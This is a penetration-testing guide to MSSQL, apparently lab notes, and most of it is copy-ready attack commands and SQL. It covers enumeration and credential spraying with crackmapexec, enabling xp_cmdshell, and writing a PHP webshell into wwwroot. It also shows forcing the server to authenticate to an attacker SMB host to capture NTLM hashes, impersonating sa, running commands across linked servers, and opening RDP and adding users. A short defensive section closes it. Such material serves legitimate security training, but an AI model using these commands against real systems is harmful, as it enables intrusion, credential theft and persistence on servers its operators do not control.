# MSSQL

## MSSQL Services

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It's widely deployed in enterprise environments, making it a valuable target during penetration testing engagements. This guide covers essential techniques for enumerating, accessing, and exploiting MSSQL servers.

### Protocol Overview

MSSQL primarily operates on:

* **TCP/1433**: Default port for the SQL Server service
* **UDP/1434**: SQL Server Browser service (helps clients find instance information)
* **TCP/2433**: Used when MSSQL operates in "hidden" mode

### Authentication Mechanisms

MSSQL supports two authentication modes:

| Authentication Type                   | Description                                                                                                             |
| ------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| Windows authentication mode (default) | Integrates with Windows/Active Directory security. Windows user and group accounts are trusted to log in to SQL Server. |
| Mixed mode                            | Supports both Windows authentication and SQL Server authentication (username/password pairs stored in SQL Server).      |

### Enumeration Techniques

#### Port Scanning

```bash
# Basic scan
nmap -p 1433,1434 -sV 10.129.201.57

# Script scan
nmap -p 1433 --script ms-sql* 10.129.201.57
```

Example output:

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00
| ms-sql-info: 
|   10.129.201.57:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.201.57\pipe\sql\query
```

#### Using crackmapexec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) is excellent for MSSQL enumeration:

```bash
# Check for MSSQL servers in a subnet
crackmapexec mssql 10.129.201.0/24

# Try valid credentials
crackmapexec mssql 10.129.201.57 -u sa -p Password123!
```

### MSSQL Client Connections

#### Using sqlcmd

`sqlcmd` is Microsoft's command-line utility for SQL Server:

```bash
# Connect to a server
sqlcmd -S 10.129.201.57 -U sa -P Password123! -y 30 -Y 30
```

Command options:

* `-S`: Server name
* `-U`: Username
* `-P`: Password
* `-y`: SQLCMDMAXVARTYPEWIDTH (for better output formatting)
* `-Y`: SQLCMDMAXFIXEDTYPEWIDTH (for better output formatting)

#### Using sqsh (Linux alternative)

```bash
sqsh -S 10.129.201.57 -U sa -P Password123! -h
```

#### Using Impacket's mssqlclient.py

```bash
mssqlclient.py -p 1433 sa@10.129.201.57
```

When prompted, enter the password.

### Default System Databases

MSSQL includes several system databases:

| Database   | Purpose                                                    |
| ---------- | ---------------------------------------------------------- |
| `master`   | Stores system-level information for an SQL Server instance |
| `msdb`     | Used by SQL Server Agent for scheduling alerts and jobs    |
| `model`    | Template database that's copied for each new database      |
| `resource` | Read-only database containing system objects               |
| `tempdb`   | Holds temporary objects or intermediate result sets        |

### Post-Authentication Enumeration

Once authenticated, explore the MSSQL environment:

#### Listing Databases

```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

Example output:

```
name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### Selecting a Database

```sql
USE htbusers
GO
```

#### Listing Tables

```sql
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
```

#### Querying Data

```sql
SELECT * FROM users
GO
```

### Command Execution through MSSQL

MSSQL provides several methods for executing system commands:

#### Using xp\_cmdshell

```sql
-- Check if xp_cmdshell is enabled
EXEC sp_configure 'xp_cmdshell'
GO

-- Enable xp_cmdshell if it's disabled
EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXEC sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- Execute a command
EXEC xp_cmdshell 'whoami'
GO
```

Example output:

```
output
-----------------------------
no service\mssql$sqlexpress
NULL
```

#### Other Command Execution Methods

* **Extended stored procedures**: Adding custom procedures
* **CLR Assemblies**: Using .NET code within SQL Server
* **SQL Server Agent Jobs**: Scheduled tasks that can execute commands
* **External scripts**: Running scripts in external languages (R, Python)

### File System Access

#### Reading Files

```sql
-- Using OPENROWSET with BULK option
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

#### Writing Files

```sql
-- Enable Ole Automation Procedures (requires admin)
EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXEC sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

-- Create a file
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["cmd"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

### Capturing MSSQL Service Account Hash

MSSQL servers can be tricked into authenticating to an attacker-controlled SMB server, revealing the service account's NTLMv2 hash:

```sql
-- Using xp_dirtree
EXEC master..xp_dirtree '\\10.10.14.15\share\'
GO

-- Using xp_subdirs
EXEC master..xp_subdirs '\\10.10.14.15\share\'
GO
```

To capture the hash:

```bash
# Using Responder
sudo responder -I tun0

# Using Impacket
sudo impacket-smbserver share ./ -smb2support
```

### User Impersonation

MSSQL allows users with the `IMPERSONATE` permission to take on the permissions of other users:

```sql
-- Identify users that can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Check current user and role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Impersonate another user
EXECUTE AS LOGIN = 'sa'
GO

-- Verify impersonation
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Revert to original user
REVERT
GO
```

### Linked Servers

Linked servers allow a SQL Server to connect to other database servers, potentially extending your attack surface:

```sql
-- Identify linked servers
SELECT srvname, isremote FROM sysservers
GO

-- Execute commands on linked servers
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO

-- Enable xp_cmdshell on linked server
EXECUTE('sp_configure "show advanced options", 1; RECONFIGURE') AT [LINKED.SERVER]
EXECUTE('sp_configure "xp_cmdshell", 1; RECONFIGURE') AT [LINKED.SERVER]

-- Execute commands on linked server
EXECUTE('xp_cmdshell ''whoami''') AT [LINKED.SERVER]
```

### MSSQL Penetration Testing Methodology

1. **Discovery**: Identify MSSQL instances through port scanning
2. **Version enumeration**: Determine SQL Server version
3. **Authentication testing**: Test common credentials and authentication methods
4. **Privilege assessment**: Determine the privileges of authenticated users
5. **Configuration review**: Check for misconfigurations
6. **Data enumeration**: Explore accessible databases and data
7. **Command execution testing**: Test for xp\_cmdshell and other methods
8. **Linked server testing**: Identify and test linked servers
9. **Lateral movement**: Use MSSQL as a pivot point to access other systems

### Common Vulnerabilities

1. **Weak credentials**: Default or weak passwords
2. **Excessive privileges**: Users with unnecessary sysadmin role
3. **xp\_cmdshell enabled**: Allows command execution
4. **Unpatched instances**: Missing security updates
5. **Insecure configuration**: Improper service account privileges
6. **Linked server misconfigurations**: Overly permissive links between servers

### RDP Access Through MSSQL

If you've gained administrative access to a SQL Server, you might be able to enable RDP access:

```sql
-- Enable RDP through registry (requires sysadmin)
EXEC xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
GO

-- Allow RDP through firewall
EXEC xp_cmdshell 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'
GO

-- Add user to Remote Desktop Users group
EXEC xp_cmdshell 'net localgroup "Remote Desktop Users" myuser /add'
GO
```

### Practical Attack Scenarios

#### Scenario 1: Initial Access via Weak Credentials

1. Discover MSSQL server with port scanning
2. Brute force sa account using common passwords
3. Authenticate to the server
4. Enable and execute xp\_cmdshell
5. Create a reverse shell

#### Scenario 2: Lateral Movement via Linked Servers

1. Authenticate to a MSSQL server
2. Discover linked servers
3. Test for command execution on linked servers
4. Extract credentials or create backdoors on linked servers
5. Pivot to additional network segments

#### Scenario 3: Privilege Escalation via User Impersonation

1. Authenticate with limited privileges
2. Identify users that can be impersonated
3. Impersonate a user with sysadmin role
4. Execute privileged commands
5. Establish persistence

### Defensive Measures

When reporting MSSQL vulnerabilities, consider recommending:

1. **Use Windows Authentication**: Avoid SQL authentication when possible
2. **Apply principle of least privilege**: Limit sysadmin role
3. **Disable xp\_cmdshell**: Unless explicitly needed
4. **Implement network segmentation**: Restrict access to SQL Servers
5. **Regular patching**: Keep SQL Server updated
6. **Audit user activities**: Enable SQL Server auditing
7. **Secure linked servers**: Carefully control linked server configurations
8. **Use strong service account passwords**: Prevent credential theft attacks

### Practical MSSQL Testing Commands

#### Finding MSSQL Servers

```bash
# Using nmap
sudo nmap -sS -p 1433 10.129.0.0/24 --open

# Using CrackMapExec
crackmapexec mssql 10.129.0.0/24
```

#### Testing Multiple Credentials

```bash
# Using CrackMapExec
crackmapexec mssql 10.129.201.57 -u users.txt -p passwords.txt
```

#### Automating Command Execution

```bash
# Using Impacket with command execution
mssqlclient.py -windows-auth DOMAIN/username:password@10.129.201.57 -debug
SQL> EXEC xp_cmdshell 'powershell -e <base64EncodedCommand>'
```

By understanding MSSQL services and their attack vectors, penetration testers can effectively identify vulnerabilities and provide valuable recommendations for securing these critical database systems.
